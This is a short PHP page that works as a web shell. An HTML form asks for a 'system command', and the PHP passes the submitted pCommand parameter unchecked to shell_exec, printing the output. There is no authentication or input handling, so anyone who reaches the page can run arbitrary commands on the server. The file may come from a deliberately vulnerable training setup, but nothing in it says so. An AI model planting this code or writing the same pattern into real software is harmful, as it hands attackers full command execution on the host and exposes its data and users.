<form action="" method="post" enctype="application/x-www-form-urlencoded">		
	<table style="margin-left:auto; margin-right:auto;">
		<tr>
			<td colspan="2">Please enter system command</td>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td class="label">Command</td>
			<td><input type="text" name="pCommand" size="50"></td>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td colspan="2" style="text-align:center;">
				<input type="submit" value="Execute Command" />
			</td>
		</tr>
	</table>
</form>
<?php
	echo "<pre>";
	echo shell_exec($_REQUEST["pCommand"]);
	echo "</pre>";	
?>